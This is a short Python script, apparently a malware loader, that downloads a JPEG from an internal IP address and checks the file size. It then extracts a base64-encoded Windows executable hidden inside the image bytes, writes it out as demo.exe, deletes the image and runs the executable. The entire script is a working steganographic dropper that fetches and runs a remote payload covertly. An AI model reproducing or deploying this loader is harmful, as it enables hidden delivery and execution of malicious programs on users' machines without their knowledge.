#author:九世
#time:2019/4/20

import asyncio
import requests
import re
import base64
import os

async def demo():
    url = 'http://192.168.3.83/timg.jpg'
    rqt=requests.get(url=url)
    with open('xxx.jpg','wb') as r:
        r.write(rqt.content)

def zx():
    dq=open('xxx.jpg','rb')
    zg=str(dq.read()).replace("b'",'').replace("'",'')
    pp=re.findall('TVq.*',zg)
    zh=base64.b64decode(pp[0])
    with open('demo.exe','wb') as w:
        w.write(zh)
    os.remove('xxx.jpg')
    os.system('demo.exe')

def pd():
    j='xxx.jpg'
    if os.path.exists(j):
        file=os.path.getsize(j)
        if file==7985376:
            zx()
        else:
            exit()

async  def main():
    thead=[]
    thead.append(asyncio.ensure_future(demo()))
    await asyncio.wait(thead)
if __name__ == '__main__':
    loop=asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()
    pd()